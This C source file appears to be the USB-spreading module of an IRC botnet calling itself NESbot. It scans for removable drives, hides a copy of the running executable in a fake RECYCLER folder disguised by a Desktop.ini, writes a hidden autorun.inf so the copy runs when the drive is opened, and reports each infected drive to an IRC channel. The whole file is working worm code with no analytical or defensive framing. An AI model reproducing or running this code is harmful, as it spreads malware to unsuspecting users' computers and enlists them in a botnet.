#include "../h/includes.h"
#include "../h/functions.h"
HMODULE shlwapi;
FARPROC strcpyn_e;
char shlwapi_c[]   = "shlwapi.dll";
char strcpyn_c[]             = "StrCpyNW";
void loadapis(void)
{
  shlwapi  = LoadLibrary(shlwapi_c);
  strcpyn_e  = GetProcAddress(shlwapi, strcpyn_c);
}

char USB_STR_RECYCLER[]	     = "\\RECYCLER";
char USB_STR_RECYCLER2[]     = "RECYCLER";
char USB_STR_REC_SUBDIR[]	     = "\\S-1-6-21-2434476501-1644491937-600003330-1213";
char USB_STR_DESKTOP_DATA[]	 = "[.ShellClassInfo]\r\nCLSID={645FF040-5081-101B-9F08-00AA002F954E}";
char USB_STR_DESKTOP_INI[]	 = "\\Desktop.ini";
char USB_STR_AUTORUN_INF[]	 = "\\autorun.inf";
char USB_STR_AUTORUN_DATA1[] = "[autorun]\r\nopen=";
char USB_STR_AUTORUN_DATA2[] = "\r\nicon=%SystemRoot%\\system32\\SHELL32.dll,4\r\naction=Open folder to view files\r\nshell\\open=Open\r\nshell\\open\\command=";
char USB_STR_AUTORUN_DATA3[] = "\r\nshell\\open\\default=1";
char USB_STR_INFECTED[]      = "[\2NES\2bot] \2»\2› [\2U\2SB] Infected: ";

int IsFileExist(LPSTR lpszFilename)
{
   DWORD dwAttr = GetFileAttributes(lpszFilename);
   if (dwAttr == 0xffffffff)
       return 0;
   else
       return 1;
}


int USBinfectDrive(char *drv)
{
	loadapis();
	char	szFile[512], szTemp[512], *p;
	int		i;
	HANDLE	f;
	DWORD	d;

	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;

	// create RECYCLER
	strcat(szFile, drv);
	strcat(szFile, USB_STR_RECYCLER);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
	{
		SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
		if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
	    return 1;
    }
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	// create RECYCLER sub-dir
	strcat(szFile, USB_STR_REC_SUBDIR);
	if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
	{
		SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
		if (!CreateDirectory(szFile, NULL) && GetLastError() != ERROR_ALREADY_EXISTS)
	    return 1;
    }
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);
	// create Desktop.ini
	strcat(szTemp, USB_STR_DESKTOP_DATA);
	strcat(szFile, USB_STR_DESKTOP_INI);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(szFile);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM, 0);
	//if (f < (HANDLE)1)
	//	return 1;
	if (!WriteFile(f, USB_STR_DESKTOP_DATA, strlen(USB_STR_DESKTOP_DATA), &d, NULL))
	{
		CloseHandle(f);
		return 1;
	}
	CloseHandle(f);

	// copy .exe file
	char filename[MAX_PATH];
    GetModuleFileName(GetModuleHandle(NULL), filename, sizeof(filename)); /* getting current filename */
	p = szFile + strlen(szFile);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(szFile);
	while (p[0] != '\\')
		p--;
	p++;
	*p = 0;
	strcat(szFile, exename);
	CopyFile(filename, szFile, TRUE);
	// todo: add crc or md5 check for file
	SetFileAttributes(szFile, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);

	// create autorun.inf data
    for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;
	strcpy(szTemp, USB_STR_AUTORUN_DATA1);
    strcat(szTemp, USB_STR_RECYCLER2);
    strcat(szTemp, USB_STR_REC_SUBDIR);
    strcat(szTemp, "\\");
    strcat(szTemp, exename);
    strcat(szTemp, USB_STR_AUTORUN_DATA2);
    strcat(szTemp, USB_STR_RECYCLER2);
    strcat(szTemp, USB_STR_REC_SUBDIR);
    strcat(szTemp, "\\");
    strcat(szTemp, exename);
    strcat(szTemp, USB_STR_AUTORUN_DATA3);

	// create autorun.inf file
	for (i = 0; i < sizeof(szFile); i++)
		szFile[i] = 0;
	strcat(szFile, drv);
	strcat(szFile, USB_STR_AUTORUN_INF);
	SetFileAttributes(szFile, FILE_ATTRIBUTE_NORMAL);
	DeleteFile(szFile);
	f = CreateFile(szFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY, 0);
	if (f < (HANDLE)1)
		return 1;
	if (!WriteFile(f, szTemp, strlen(szTemp), &d, NULL))
	{
		CloseHandle(f);
		return 1;
	}

	//CloseHandle(f);
	return 0;
}

DWORD WINAPI RemoteUSBThread(LPVOID param)
{
	NTHREAD usb = *((NTHREAD *)param);
	NTHREAD *usbs = (NTHREAD *)param;
	usbs->gotinfo = TRUE;
	IRC* irc=(IRC*)usb.conn;
    char		szTemp[512], buff[512], myszfile[512];
	char 		szDrive[3];
	char		*p;
	int			i;

	for (i = 0; i < sizeof(szTemp); i++)
		szTemp[i] = 0;

    for (i = 0; i < sizeof(myszfile); i++)
		myszfile[i] = 0;

	szDrive[0] = 0;
	for (;;)
	{
		Sleep(15000);


    	if (GetLogicalDriveStrings(512 - 1, szTemp))
    	{
        	p = szTemp;

        	do
        	{
				*szDrive = *p;

				if (szDrive[0] != 65 && szDrive[0] != 66 && szDrive[0] != 97 && szDrive[0] != 98)
				{

                    if (strstr(szDrive, ":\\") == 0) { strcat(szDrive, ":\\"); }
                    memset(myszfile, 0, sizeof(myszfile));
                    strcpy(myszfile, szDrive);
                    strcat(myszfile, USB_STR_RECYCLER);
                    strcat(myszfile, USB_STR_REC_SUBDIR);
                    strcat(myszfile, exename);
                    if (IsFileExist(myszfile) != 1)
                    {
					if (GetDriveType(szDrive) == DRIVE_REMOVABLE)
					{

						if (USBinfectDrive(szDrive) == 0)
						{

							for (i = 0; i < sizeof(buff); i++)
								buff[i] = 0;
							strcat(buff, USB_STR_INFECTED);
							strcat(buff, szDrive);
							irc->pmsg(InfoChan, buff);
						}
					}
					}



				}

           		while (*p++);

			} while (*p);
		}
	}
}
